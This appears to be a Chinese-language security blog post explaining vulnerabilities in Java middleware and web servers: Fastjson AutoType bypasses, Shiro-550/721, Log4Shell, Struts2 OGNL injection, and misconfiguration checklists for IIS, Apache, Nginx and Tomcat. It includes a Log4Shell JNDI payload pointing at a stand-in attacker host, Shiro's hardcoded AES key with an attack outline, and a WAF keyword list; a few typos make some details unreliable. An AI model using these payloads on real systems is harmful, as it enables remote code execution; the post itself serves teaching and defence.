---
title: 中间件及其漏洞
date: 2026-06-30T16:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
is_long: false
---
## Fastjson

Fastjson 是阿里巴巴开源的一款高性能 Java JSON 处理库，用于在 Java 对象与 JSON 字符串之间进行序列化与反序列化。由于其极快的解析速度，它被广泛应用与国内大量 Java Web 应用和微服务架构中，尤其在企业级系统中极为普遍。

### AutoType

Fastjson 最大的特色也是其最大的安全隐患 -- AutoType 机制。它允许 JSON 数据中通过 `@type` 字段指定反序列化的目标类。

```json
{
	"@type": "com.example.User",
	"name": "Enil",
	"age": 21
}
```

Fastjson 解析时会根据 `@type` 的值动态加载对应的 Java 类并实例化，这在功能上提供了多态支持，但也给攻击者提供了加载任意恶意类的入口。

### 漏洞历史

| 版本       | 漏洞类型                | 核心原理                                                        |
| -------- | ------------------- | ----------------------------------------------------------- |
| ≤ 1.2.24 | RCE（CVE-2017-18349） | AutoType 无限制，可直接加载 `JdbcRowSetImpl` 触发 JNDI 注入              |
| ≤ 1.2.41 | 黑名单绕过               | 类名前加 `L`、末尾加 `;` 绕过前缀检测                                     |
| ≤ 1.2.42 | 双写绕过                | 使用 `LL...;;` 双层嵌套绕过二次修复                                     |
| ≤ 1.2.47 | 缓存逻辑漏洞              | 利用 `java.lang.Class` 将黑名单类预加载进 `mappings` 缓存，绕过 autoType 检查 |
| ≤ 1.2.68 | expectClass 绕过      | 通过 `Runnable`/`Readable` 等期望类触发 `checkAutoType` 的另一条路径      |
| ≤ 1.2.80 | 异常类链绕过              | 利用异常类（Exception 子类）作为期望类绕过 1.2.68 的修复                       |

### 防御建议

- 升级至最新版本
- 开启 safeMode，`ParserConfig.getGlobalInstancce().setSafeMode(true)`。完全禁用 AutoType
- 关闭 AutoType
- WAF 规则，过滤关键词 `@type`、`JNDI`、`ldap://`、`rmi://` 等关键字流量

## Apache Shiro

Apache Shiro 是一个轻量级 Java 安全框架，提供认证、授权、加密、会话管理，可同时运用于 JavaSE 和 JavaEE 环境。

### 核心架构

- Subject：当前与系统交互的用户，可以是人或程序
- SecurityManager：Shiro 的核心，协调所有组件运作，相当于总控制器
- Realm：Shiro 与应用数据之间的桥梁，开发者自定义实现
- Authenticator：负责验证用户身份
- Authorizer：负责权限判断，决定用户是否可以执行某操作
- SessionManager：管理用户会话，无需依赖 HTTP Session
- CookieRemenberMeManager：实现 “记住我” 的 Cookie 加解密

### 两大核心漏洞

#### Shiro-550（CVE-2016-4437）

Shiro 历史上最经典、影响最广的漏洞，影响版本≤1.2.4。

原理是利用 Shiro 的 "记住我" 功能将用户信息序列化后，用 AES 加密再 Base64 编码存入 `rememberMe` Cookie。服务端收到请求时执行逆向流程：

`Base64 编码 -> AES 解密 -> 反序列化`

AES 密钥是硬编码再源码中的固定值 `kPH+bIxk5D2deZiIxcaaaA==`，攻击者可以用该密钥加密恶意序列化 Payload，服务端反序列化时触发 RCE。

攻击流程如下：

1. 用 `ysoserial` 生成恶意 Java 序列化 Payload
2. 用已知的硬编码 AES 密钥对 Payload 加密并 Base64 编码
3. 将结果作为 `rememberMe` Cookie 发送给服务器
4. 服务器反序列化 Payload，触发 RCE

#### Shiro-721（CVE-2019-12422）

**影响版本 < 1.4.2**，是对 Shiro-550 修复方案的进一步突破 。

Shiro 使用 AES-1288-CBC 模式加密，该模式存在经典漏洞 Padding Oracle。攻击者无需知道密钥，反复发送篡改后的 Cookie，观察服务器返回 500 错误还是 200 OK，逐字节推算出加密数据，最终构造出合法的恶意 Cookie，实现反序列化攻击。

## Log4j

Apache Log4j 是 Java 生态中最广泛使用的开源日志记录框架，几乎所有 Java 应用都会通过它记录程序运行日志。正因其极高的普及率，2021 年 12 月爆出的 Log4j2 漏洞被认为是自 Hearbleed 和 ShellShock 以来互联网上最严重的漏洞之一。

### Lookup 插件

Log4j2 提供了一套强大的 Lookups 机制，允许在日志内容中动态解析特定语法，例如：

```bash
${java:version}              -> 输出当前 Java 版本
${env:PATH}                  -> 输出环境变量
${jndi:ldap://example.com/a} -> 通过 JNDI 远程查找对象
```

Log4j2 在记录日志时会对 `${}` 格式的字符串进行递归解析，而这个设计本身没有对协议和来源做任何限制。

### Log4Shell（CVE-2021-44228）

**影响版本**：Log4j 2.0-beta9 ~ 2.14.1，无需身份认证，利用难度极低 。

2013 年 Log4j 2.0-beta9 引入的 JndiLookup 插件允许 JNDI（Java 命名和目录接口）远程加载 Java 对象，支持 LDAP、RMI、DNS 等多种协议。

当应用程序将用户可控的输入记录到日志时（如 HTTP 请求头、用户名、搜索关键词），攻击者只需传入如下 Payload：

```bash
${jndi:ldap://attacker.com/exploit}
```

Log4j 解析日志内容时会主动发起 LDAP 请求到攻击者服务器，攻击者的 LDAP 服务器返回一个恶意 Java 类的引用，受害服务器下载并实例化该类，触发 RCE。

## Struts2

Strurs 的一次请求理解如下：

```bash
浏览器请求 -> Struts前端过滤器 -> ActionMapper根据URL定位Action -> ActionInvocation按顺序执行拦截器找 -> 参数绑定/类型转换/校验/权限等 -> 执行Action业务逻辑 -> 返回Result -> JSP/FreeMarker等视图渲染响应
```

- Action：类控制器，接收请求、调用业务逻辑返回结果
- Interceptor：类责任链，参数绑定、校验、文件上传、异常处理等都可在 Action 前后执行
- ValueStack：请求处理期间存放 Action、模型对象、上下文数据的对象栈
- OGNL：访问和操作 ValueStack 中对象的表达式语言，视图和参数绑定都会涉及它

例如参数拦截器会把请求参数写入 ValueStack，官方文档明确指出，参数名本质上会按 OGNL 表达式处理，因此必须限制可接受的参数名和数值。

攻击者输入被框架或业务代码当成 OGNL 表达式再次解析和执行。

OGNL 能访问对象属性；如果攻击者能影响表达式执行上下文，进一步接触到 `ActionContext`、请求、会话应用对象等，就可能从表达式注入升级为严重的代码执行风险。Apache 官方也指出，Struts 的历史高危漏洞中有不少与 OGNL 的强大表达能力有关。

### 漏洞类型

1. OGNL 注入/二次解析

开发者把用户输入直接拼接进标签属性、错误信息、跳转结果或表达式，再让框架执行。

风险链路通常是：

```bash
用户可控输入 -> 被当成OGNL语句 -> 访问对象或上下文 -> 权限扩大 -> 可能导致 RCE
```

2. 文件上传
3. XXE
4. 参数绑定与越权修改

## IIS

IIS 常担任反向代理、TLS 终止、认证、请求过滤和 ASP.NET 应用托管等 “中间层” 职责。

一次 IIS 的工作请求如下：

```bash
客户端 -> HTTP.sys（内核态监听、连接与请求队列） -> WAS/应用程序池 -> w3wp.exe工作进程 -> IIS模块、Handler Mapping -> ASP.NET/PHP/静态文件等应用
```

IIS 会把请求交给对应应用程序池的工作进程处理；应用程序池可独立身份运行，因此能做站点隔离。

### 常见的隐患

1. 版本过旧
2. 目录浏览导致敏感文件泄露
3. 请求过滤不足：路径穿越、双重编码、危险扩展名
4. WebDAV 配置不当
5. 应用程序池权限过高
6. Handler Mapping、ISAPI、CGI、FastCGI 配置不当
7. 认证与授权错误
8. 详细报错与版本泄露
9. TLS、HTTP 安全响应头配置弱
10. 上传功能与 Web 根目录混放

## Apache

Apache 的风险不仅取决于 `httpd` 主程序，也取决于是否启用了 `mod_http2`、`mod_proxy`、`mod_rewrite`、`mod_lua`、`mod_dav`、`mod_ssl` 等模块。

### 常见的安全隐患

1. 版本与模块漏洞
2. 配置错误导致任意文件或敏感文件泄露
3. 目录列表与目录遍历
4. `.htaccess` 权限过宽
5. CGI、PHP、Perl、Python 等动态脚本执行风险
6. 反向代理、开放代理和 SSRF 风险
7. `mod_rewrite` 规则导致绕过、SSRF 或路径问题
8. 管理界面和状态信息泄露
9. TLS、证书和安全响应头配置不足
10. 权限、日志和运行账户配置不当

## Nginx

### 常见安全 隐患

Nginx 是 Web 服务器、反向代理、负载均衡和缓存组件。本身新能很高，但是在真实的项目中，风险往往来自 “反向代理配置、静态文件映射、信任边界和权限设计”。

1. 版本与模块漏洞
2. `root`、`alias`、`location` 配置错误导致文件泄露
3. 目录列表和符号链接泄露
4. 反向代理信任边界错误
5. 动态 `proxy_pass` 引发 SSRF 或开放代理
6. 上传目录可执行，形成 WebShell 风险
7. 拒绝服务
8. TLS 与安全响应头配置不足
9. 缓存配置不当导致越权或隐私泄露
10. 管理与状态页面暴露

## Tomcat

1. 版本过旧与协议类漏洞
2. Manager/Host Manager 管理后台暴露
3. AJP 连接器暴露
4. 自动部署与可写 `webapps` 目录
5. Tomcat 运行权限过高
6. DefaultServlet 或上传配置不当
7. Realm、弱口令、暴力破解
8. JMX 远程管理接口暴露
9. 错误页、版本号和调试信息泄露
10. 反向代理、路径解析与请求走私
